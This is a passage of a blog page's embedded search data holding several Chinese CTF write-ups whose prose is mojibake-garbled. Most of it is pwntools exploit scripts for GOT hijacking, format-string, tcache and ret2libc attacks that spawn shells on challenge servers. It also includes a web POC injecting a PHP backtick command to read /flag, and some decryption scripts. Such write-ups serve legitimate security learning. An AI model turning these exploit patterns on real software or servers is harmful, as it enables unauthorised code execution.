io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot;Size: &amp;quot;,b&amp;quot;1&amp;quot;)
print(&amp;quot;asd  &amp;quot;+hex(mmap))

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™é‡Œæˆ‘ä»¬ç”³è¯·5ä¸ªchunkï¼Œæœ€åä¸€ä¸ªchunkç”³è¯·é˜²æ­¢åç»­è¿›è¡Œunlinkæ“ä½œæ—¶å€™åå‘chunkä¸top chunkåˆå¹¶ï¼›&lt;br&gt;
chunk 0å’Œchunk 3å¤§å°å‡å¤§äº0x410,å¦åˆ™é‡Šæ”¾æ—¶ä¼šè¢«æ”¾è¿›tcachebinè€Œä¸æ˜¯ unsortedbinä¸­ï¼Œï¼Œé¦–å…ˆé‡Šæ”¾chunk 0ï¼Œç„¶åä¿®æ”¹chunk 3çš„presizeä»¥å‡†å¤‡unlinkæ“ä½œï¼ˆé€šè¿‡fill chunk 2å®ç°ï¼Œæº¢å‡º&lt;code&gt;\x00&lt;/code&gt;å°†&lt;code&gt;0x501&lt;/code&gt;ä¿®æ”¹ä¸º&lt;code&gt;0x500&lt;/code&gt;ï¼Œæ­¤æ—¶é‡Šæ”¾chunk 3 ï¼Œå¯ä»¥çœ‹åˆ°0123éƒ½è¢«åˆå¹¶&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1681452969182.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;ï¼Œ&lt;br&gt;
ç„¶åé‡Šæ”¾1ï¼Œ2å †å—&lt;br&gt;
æ­¤æ—¶æˆ‘ä»¬å†åˆ†é…ä¸¤ä¸ªå †å—ï¼Œåˆ†åˆ«åŒ…å«0å’Œ1ï¼Œ2å’Œ3ï¼Œä»¥å®ç°chunk overlappingï¼Œ&lt;br&gt;
æ¥ä¸‹æ¥ï¼Œä¿®æ”¹0ï¼Œ1å †å—ï¼Œå †å—0å°†nextæŒ‡é’ˆä¿®æ”¹ä¸ºmmapåœ°å€ï¼Œå †å—1å°†nextæŒ‡é’ˆä½ä½å­—èŠ‚ä¿®æ”¹ä¸º&lt;code&gt;\x30&lt;/code&gt;ä½¿å…¶æŒ‡å‘malloc_hook;&lt;br&gt;
æ¥ä¸‹æ¥å°±æ˜¯tcachebin attackè¿‡ç¨‹äº†ï¼Œåˆ†é…å †å—åˆ°æŒ‡å®šå†…å­˜åœ°å€ä¸Šè¿›è¡Œè¯»å†™ï¼Œmmapåœ°å€å†™å…¥shellcode,malloc_hookä¸Šå†™å…¥mmapåœ°å€ï¼›&lt;br&gt;
æœ€åå‡ºå‘malloc_hookï¼Œæ‰§è¡Œshellcodeæ¥getshell&lt;/p&gt;
">sctf2019_easy_heap wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/5-Lmbm_Ch/"" data-c="
          &lt;p&gt;64ä½åŠ«æŒgotè¡¨(æ³¨æ„æå‰æ›´æ¢libcï¼š&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1681139324722.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ç¬¬ä¸€æ¬¡è¾“å…¥è´Ÿæ•°ç»•è¿‡é•¿åº¦æ£€æŸ¥å¹¶ä¸”å¯ä»¥åå‘æº¢å‡ºåˆ°bssæ®µå‰çš„gotè¡¨ï¼Œç”±æ­¤ç¬¬äºŒæ¬¡è¾“å…¥å¯ä»¥åŠ«æŒgotè¡¨å†…å®¹&lt;br&gt;
åŠ«æŒexit()ä¸º_startï¼Œç”±æ­¤å¯ä»¥è¿”å›å†æ¬¡è¾“å…¥&lt;br&gt;
æ¥ä¸‹æ¥æ³„éœ²libcï¼Œæ³¨æ„åœ°å€å¾—å¯¹é½ï¼Œå› ä¸ºå†…å­˜å®é™…åœ°å€åªæœ‰æœ«ä¸‰ä½å›ºå®šï¼Œåˆ™é€‰æ‹©æ³„éœ²çš„gotè¡¨åç§»æœ«å°¾ä¸º0çš„å‡ é¡¹éƒ½è¡Œï¼Œä¸º8çš„ä¸è¡Œï¼Œæ³¨æ„å‘é€æ—¶æå‰gdbè°ƒè¯•è·å–ä¸€ä¸‹å®é™…åœ°å€æœ«å°¾2ä½å†å‘é€ï¼Œé¿å…è¾“å…¥ä¿®æ”¹å®é™…åœ°å€&lt;br&gt;
æ³„éœ²libcåå†æ¬¡è¿”å›å¼€å¤´ï¼ŒåŠ«æŒputsçš„gotè¡¨åœ°å€ä¸ºsystemå‡½æ•°åœ°å€ï¼Œå°†puts_got-0x8è¦†ç›–ä¸º&lt;code&gt;/bin/sh\x00&lt;/code&gt;,æ‰€ä»¥è¾“å…¥-9å°†è¾“å…¥æµå®šä½åˆ°åç§»0x404010å¤„ï¼Œå³puts_got-0x8å¤„ï¼Œæ–¹ä¾¿ä¸€æ¬¡æ€§è¯»å…¥ç„¶ågetshell&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./vuln&amp;quot;)
io=remote(&amp;quot;node1.anna.nssctf.cn&amp;quot;,28201)
elf=ELF(&amp;quot;./vuln&amp;quot;)
libc=ELF(&amp;quot;./libc-2.31.so&amp;quot;)

start_addr=elf.sym[b&amp;quot;_start&amp;quot;]
puts_got=elf.got[b&amp;quot;puts&amp;quot;]

io.sendlineafter(b&amp;quot;one.\n&amp;quot;,b&amp;quot;-6&amp;quot;)
io.recvuntil(b&amp;quot;name\n&amp;quot;)
payload=p64(start_addr)

# gdb.attach(io)
# pause()

io.sendline(payload)


io.sendlineafter(b&amp;quot;one.\n&amp;quot;,b&amp;quot;-8&amp;quot;)
io.recvuntil(b&amp;quot;name\n&amp;quot;)
payload=b&amp;quot;\xd0&amp;quot;
io.send(payload)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;setbuf&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_bin_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))

io.sendlineafter(b&amp;quot;one.\n&amp;quot;,b&amp;quot;-9&amp;quot;)
io.recvuntil(b&amp;quot;name\n&amp;quot;)
payload=b&amp;quot;/bin/sh\x00&amp;quot;+p64(sys_addr)
io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[HGAME 2023 week1]choose_the_seat wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/a8Nkgfp0x/"" data-c="
          &lt;p&gt;æ­¤é¢˜64ä½æ ¼å¼åŒ–å­—ç¬¦ä¸²åŠ«æŒgotè¡¨å³å¯ï¼Œæ³¨æ„æ¥æ”¶å’Œä¼ å‚ï¼Œone_gagdetè²Œä¼¼æ‰“ä¸é€š&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1681118319987.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])



# io=process(&amp;quot;./OilSpill&amp;quot;)
io=remote(&amp;quot;node2.anna.nssctf.cn&amp;quot;,28755)
elf=ELF(&amp;quot;./OilSpill&amp;quot;)
libc=ELF(&amp;quot;./libc.so&amp;quot;)

pop_rdi_ret=0x4007e3
ret=0x400536
x=0x600C80
puts_got=elf.got[b&amp;quot;puts&amp;quot;]

libc_addr=int(io.recvuntil(b&amp;quot;, &amp;quot;)[:-2],16)-libc.sym[b&amp;quot;puts&amp;quot;]
printf_addr=int(io.recvuntil(b&amp;quot;, &amp;quot;)[:-2],16)
stack_addr=int(io.recvuntil(b&amp;quot;, &amp;quot;)[:-2],16)
# temp=int(io.recvuntil(b&amp;quot;, &amp;quot;)[:-2],16)
print(&amp;quot;libc_addr: &amp;quot;+hex(libc_addr))
print(&amp;quot;stack_addr: &amp;quot;+hex(stack_addr))
print(&amp;quot;printf_addr: &amp;quot;+hex(printf_addr))

# gdb.attach(io)
# pause()


str_bin_sh=libc_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
sys_addr=libc_addr+libc.sym[b&amp;quot;system&amp;quot;]
# one_gadget=[0x4f2a5,0x4f302,0x10a2fc]
# shell=one_gadget[1]+libc_addr


io.recvuntil(b&amp;quot;clean it?\n&amp;quot;)
payload=fmtstr_payload(8,{puts_got:sys_addr,x:b&amp;quot;/bin/sh\x00&amp;quot;})
io.sendline(payload)
io.interactive()

# 0x4f2a5 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL

# 0x4f302 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a2fc execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL

# Gadgets information
# ============================================================
# 0x00000000004007dc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004007de : pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004007e0 : pop r14 ; pop r15 ; ret
# 0x00000000004007e2 : pop r15 ; ret
# 0x00000000004007db : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004007df : pop rbp ; pop r14 ; pop r15 ; ret
# 0x00000000004005f8 : pop rbp ; ret
# 0x00000000004007e3 : pop rdi ; ret
# 0x00000000004007e1 : pop rsi ; pop r15 ; ret
# 0x00000000004007dd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400536 : ret
# 0x00000000004006cb : ret 0x8b48

# Unique gadgets found: 12
&lt;/code&gt;&lt;/pre&gt;
">[SDCTF 2022]Oil Spill wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/h-MuOCtcb/"" data-c="
          &lt;p&gt;é˜Ÿä¼ï¼šğŸ˜ğŸ’µğŸƒğŸƒğŸ¤£ğŸ¤£ğŸ˜†ğŸ˜ğŸ˜ğŸ˜‡ğŸ˜¡ğŸƒğŸ˜†ğŸ’µâ˜ºğŸ˜‡ğŸ˜†ğŸ˜ŠğŸ˜ğŸ˜†ğŸ˜&lt;/p&gt;
&lt;h2 id=&#34;misc&#34;&gt;MISC:&lt;/h2&gt;
&lt;h3 id=&#34;ç­¾åˆ°&#34;&gt;ç­¾åˆ°:&lt;/h3&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1681016707539.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;base32 è§£å¾—&lt;/p&gt;
&lt;p&gt;flag{2dfea6c861edabefab189caf42250b20}&lt;br&gt;
&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h2 id=&#34;pwn&#34;&gt;PWN:&lt;/h2&gt;
&lt;h3 id=&#34;è¯·å¯¹ä»–ä½¿ç”¨shellcodeå§&#34;&gt;è¯·å¯¹ä»–ä½¿ç”¨shellcodeå§ï¼š&lt;/h3&gt;
&lt;p&gt;ä¸»å‡½æ•°mmapå¼€è¾Ÿä¸€æ®µå¯å†™åŒºåŸŸï¼Œè¾“å…¥å¾€å…¶ä¸­å¡«å…¥shellcodeï¼Œä½†æ˜¯lookatmeå‡½æ•°æœ‰é™åˆ¶&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1681013489240.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
è¿™é‡Œé€‰æ‹©ç»•è¿‡strlen&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1681013623713.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æ‰€ä»¥åªéœ€å°†eaxå¯„å­˜å™¨èµ‹0å³å¯&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


io=process(&amp;quot;./pwnme&amp;quot;)
# io=remote(&amp;quot;101.43.190.199&amp;quot;,28003)
elf=ELF(&amp;quot;./pwnme&amp;quot;)

io.recvuntil(b&amp;quot;&amp;gt;&amp;gt;&amp;gt;&amp;quot;)
payload=asm(&#39;mov eax,0x0&#39;)+asm(shellcraft.sh())
gdb.attach(io)
pause()

io.sendline(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h2 id=&#34;web&#34;&gt;WEB:&lt;/h2&gt;
&lt;h3 id=&#34;web-ç­¾åˆ°1&#34;&gt;web-ç­¾åˆ°1:&lt;/h3&gt;
&lt;p&gt;ctfer1å’Œ2å‚æ•°ä½¿ç”¨å¼ºç¢°æ’&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ctfer1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&amp;amp;ctfer2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ctfer3ä½¿ç”¨%00æˆªæ–­ç»•è¿‡&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; &amp;amp;ctfer3=115%00
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ctfer4ä½¿ç”¨æ‹¼æ¥ç»•è¿‡&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;ctfer4=?&amp;gt;&amp;lt;?=`ls /`;
&amp;gt;
&amp;gt;ctfer4=?&amp;gt;&amp;lt;?=`cat /flag`;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;POC:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST http://101.43.190.199:28005/ HTTP/1.1
 Host: 101.43.190.199:28005
 Content-Length: 358
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
 Origin: http://101.43.190.199:28005
 Content-Type: application/x-www-form-urlencoded
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
 Referer: http://101.43.190.199:28005/
 Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9
 Connection: close


ctfer1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&amp;amp;ctfer2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;amp;ctfer3=115%00&amp;amp;ctfer4=?&amp;gt;&amp;lt;?=`cat /flag`;
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1681016151223.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;web-é­”æ–¹&#34;&gt;web-é­”æ–¹:&lt;/h3&gt;
&lt;p&gt;ä¸€.jså®¡è®¡&lt;/p&gt;
&lt;p&gt;æ ¹æ®ä»¥å¾€çš„åšé¢˜ç»éªŒï¼Œæœ€åå‡ºflagçš„æ—¶å€™å¾€å¾€ä¼šæœ‰å¼¹çª—ï¼Œäºæ˜¯ç›´æ¥æœalertå°±å¯ä»¥æ¢­å“ˆ&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1681016252496.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;åŒæ—¶å‘ç°è¿˜éœ€è¦è§£å¯†ï¼Œé‚£å°±å¤§æ¦‚ç‡æ˜¯äº†ï¼Œç›´æ¥è¿›å…¥æ§åˆ¶å°è°ƒç”¨æ–¹æ³•æ‹¿åˆ°flagã€‚&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1681016263340.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h2 id=&#34;re&#34;&gt;Re&lt;/h2&gt;
&lt;h3 id=&#34;tutdroid&#34;&gt;tutDroid&lt;/h3&gt;
&lt;p&gt;apké™„ä»¶ï¼Œjadx-guiæ‰“å¼€ï¼Œæ¥åˆ°MainActivty&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1681016753356.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;è¾“å…¥è¢«ä¼ é€’åˆ°FlagChecker.checkæ–¹æ³•è¿›è¡ŒéªŒè¯ï¼Œå¾—åˆ°ä¸€ä¸ªkeyå’Œå¯†æ–‡&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1681016760521.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;encryptæ–¹æ³•å®é™…ä¸Šå°±æ˜¯æ ‡å‡†çš„XXTEAåŠ å¯†&lt;/p&gt;
&lt;p&gt;encryptToBase64Stringæ–¹æ³•ï¼Œå…ˆè°ƒç”¨encryptæ–¹æ³•ï¼Œå†è¿›è¡Œbase64ç¼–ç &lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1681016767633.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;é¦–å…ˆæŠŠkeyå’Œå¯†æ–‡å¤„ç†ä¸€ä¸‹ï¼Œè½¬æˆintæ•°ç»„&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import base64
enc=b&amp;quot;vlgg9nNjUcYuWzBSSOwKxbMD2rhFgf4zuiyMpLxpNkM=&amp;quot;
enc=base64.b64decode(enc)
pritnt(enc)
#b&#39;\xbeX \xf6scQ\xc6.[0RH\xec\n\xc5\xb3\x03\xda\xb8E\x81\xfe3\xba,\x8c\xa4\xbci6C&#39;
for i in range(0,len(enc),4):

  tmp=&amp;quot;0x&amp;quot;

  tmp+=hex(enc[i+3])[2:].zfill(2)

  tmp+=hex(enc[i+2])[2:].zfill(2)

  tmp+=hex(enc[i+1])[2:].zfill(2)

tmp+=hex(enc[i+0])[2:].zfill(2)   

print(tmp,end=&amp;quot;,&amp;quot;)
#0xf62058be,0xc6516373,0x52305b2e,0xc50aec48,0xb8da03b3,0x33fe8145,0xa48c2cba,0x433669bc,
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdint.h&amp;gt;

#define DELTA 0x9e3779b9
#define MX (((z &amp;gt;&amp;gt; 5 ^ y &amp;lt;&amp;lt; 2) + (y &amp;gt;&amp;gt; 3 ^ z &amp;lt;&amp;lt; 4)) ^ ((sum ^ y) + (key[(p &amp;amp; 3) ^ e] ^ z)))

void btea(uint32_t *v, int n, uint32_t const key[4]){
    uint32_t y, z, sum;
    unsigned p, rounds, e;
    //åŠ å¯†
    if (n &amp;gt; 1){
        rounds = 6 + 52 / n;
        sum = 0;
        z = v[n - 1];
        do{
            sum += DELTA;
            e = (sum &amp;gt;&amp;gt; 2) &amp;amp; 3;
            for (p = 0; p &amp;lt; n - 1; p++){
                y = v[p + 1];
                z = v[p] += MX;
            }
            y = v[0];
            z = v[n - 1] += MX;
        } while (--rounds);
    }
    //è§£å¯†
    else if (n &amp;lt; -1){
        n = -n;
        rounds = 6 + 52 / n;
        sum = rounds * DELTA;
        y = v[0];
        do{
            e = (sum &amp;gt;&amp;gt; 2) &amp;amp; 3;
            for (p = n - 1; p &amp;gt; 0; p--){
                z = v[p - 1];
                y = v[p] -= MX;
            }
            z = v[n - 1];
            y = v[0] -= MX;
            sum -= DELTA;
        } while (--rounds);
    }
}
void print_data(uint32_t *v, int n, bool hex_or_chr)
{
    if (hex_or_chr){
        for (int i = 0; i &amp;lt; n; i++){
            printf(&amp;quot;0x%x,&amp;quot;, v[i]);
        }
    }
    else
    {
        for (int i = 0; i &amp;lt; n; i++){
            for (int j = 0; j &amp;lt; sizeof(uint32_t) / sizeof(uint8_t); j++){
                printf(&amp;quot;%c&amp;quot;, (v[i] &amp;gt;&amp;gt; (j * 8)) &amp;amp; 0xFF);
            }
        }
    }
    printf(&amp;quot;\n&amp;quot;);
    return;
}

int main()
{
    // vä¸ºè¦åŠ è§£å¯†çš„æ•°æ®
    uint32_t v[] = {0xf62058be, 0xc6516373, 0x52305b2e, 0xc50aec48, 0xb8da03b3, 0x33fe8145, 0xa48c2cba, 0x433669bc};
    // kä¸ºåŠ è§£å¯†å¯†é’¥ï¼Œ4ä¸ª32ä½æ— ç¬¦å·æ•´æ•°ï¼Œå¯†é’¥é•¿åº¦ä¸º128ä½
    uint32_t k[4] = {0x57764241, 0x71683757, 0x48764e77, 0x50666855};

    int n = sizeof(v) / sizeof(uint32_t);
    btea(v, -n, k);

    printf(&amp;quot;è§£å¯†åæ˜æ–‡æ•°æ®ï¼š&amp;quot;);
    print_data(v, n, 1);

    printf(&amp;quot;è§£å¯†åæ˜æ–‡å­—ç¬¦ï¼š&amp;quot;);
    print_data(v, n, 0);

    return 0;
}

// flag{pldCiQuCBtakT4ctlsZQ}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;uglyqt&#34;&gt;uglyqt:&lt;/h3&gt;
&lt;p&gt;idaæ‰“å¼€ï¼Œæœç´¢å­—ç¬¦ä¸²&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1681016782971.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;äº¤å‰å¼•ç”¨è¿‡å»&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;7&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1681016789390.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;ç”¨æˆ·åä¸ºâ€zhanghaoâ€&lt;/p&gt;
&lt;p&gt;å¯†ç ç»è¿‡å˜æ¢ï¼Œå˜æ¢åä¸â€lrgmLVzwcwh5yhy4hgEuxfJâ€æ¯”è¾ƒ&lt;/p&gt;
&lt;p&gt;å¯†ç çš„å˜æ¢è¿‡ç¨‹åœ¨sub_401580å‡½æ•°&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;8&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1681016797390.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import string

enc = &amp;quot;lrgmLVzwcwh5yhy4hgEuxfJ&amp;quot;

flag = &amp;quot;&amp;quot;

for c in enc:
    if c.islower():
        for i in string.ascii_lowercase:
            if ord(c) == (ord(i)-91) % 26+97:
                flag += i
    elif c.isupper():
        for i in string.ascii_uppercase:
            if ord(c) == (ord(i)-60) % 26+65:
                flag += i
    else:
        for i in string.digits:
            if ord(c) == (ord(i)-44) % 10+48:
                flag += i

print(flag)
# flagGQtqwqb1sbs0baZorzE
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åœ¨ç¨‹åºä¸­æ­£å¸¸è¿è¡Œ&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;9&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1681016803607.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;å†æ ¹æ®flagæ ¼å¼è°ƒæ•´ä¸‹ï¼Œâ€GEâ€æ¢æˆâ€{}â€ï¼Œâ€bâ€æ¢æˆâ€_â€&lt;/p&gt;
&lt;p&gt;å¾—åˆ°flag{Qtqwq_1s_s0_aZorz}&lt;/p&gt;
">TUTCTF2023 wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/fav_tKSYV/"" data-c="
          &lt;h3 id=&#34;fibonacci&#34;&gt;fibonacciï¼š&lt;/h3&gt;
&lt;p&gt;æ•°ç»„ä¸‹æ ‡æ— æ£€æŸ¥ï¼Œè´Ÿæ•°å¯ä»¥åå‘æº¢å‡ºè¦†ç›–gotè¡¨çš„__stack_chk_failæ¥ç»•è¿‡canaryï¼Œä¹‹året2libcï¼Œæœ€åæ‰“one_gadgetæ³¨æ„æ¡ä»¶&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./[HZNUCTF 2023 final]fibonacci&amp;quot;)
io=remote(&amp;quot;node1.anna.nssctf.cn&amp;quot;,28253)
elf=ELF(&amp;quot;./[HZNUCTF 2023 final]fibonacci&amp;quot;)
libc=ELF(&amp;quot;./libc.so&amp;quot;)

pop_rdi_ret=0x401a33
vuln=0x4019a2
puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]
puts_got=elf.got[b&amp;quot;puts&amp;quot;]
ret=0x40101a
one_gadget=[0xe3afe,0xe3b01,0xe3b04]
pop_r12_r13_r14_r15_ret=0x401a2c


io.sendlineafter(&amp;quot;choice &amp;gt;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
io.sendlineafter(&amp;quot;one?\n&amp;quot;,b&amp;quot;-55&amp;quot;)
io.sendlineafter(b&amp;quot;number\n&amp;quot;,str(ret))

io.sendlineafter(&amp;quot;choice &amp;gt;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
io.sendlineafter(&amp;quot;one?\n&amp;quot;,b&amp;quot;0&amp;quot;)
payload=b&amp;quot;\x00&amp;quot;+b&amp;quot;a&amp;quot;*0x57+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(vuln)
io.sendlineafter(b&amp;quot;number\n&amp;quot;,payload)


leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))

sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_bin_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
shell=leak_addr+one_gadget[0]

io.sendlineafter(&amp;quot;choice &amp;gt;&amp;gt; &amp;quot;,b&amp;quot;3&amp;quot;)

io.sendlineafter(&amp;quot;choice &amp;gt;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
io.sendlineafter(&amp;quot;one?\n&amp;quot;,b&amp;quot;1&amp;quot;)
payload=b&amp;quot;\x00&amp;quot;+b&amp;quot;a&amp;quot;*0x57+p64(pop_r12_r13_r14_r15_ret)+p64(0)*4+p64(shell)
# gdb.attach(io)
# pause()
io.sendlineafter(b&amp;quot;number\n&amp;quot;,payload)

io.interactive()

# Gadgets information
# ============================================================
# 0x0000000000401a2c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401a2e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401a30 : pop r14 ; pop r15 ; ret
# 0x0000000000401a32 : pop r15 ; ret
# 0x0000000000401a2b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401a2f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040121d : pop rbp ; ret
# 0x00000000004016f6 : pop rbx ; pop rbp ; ret
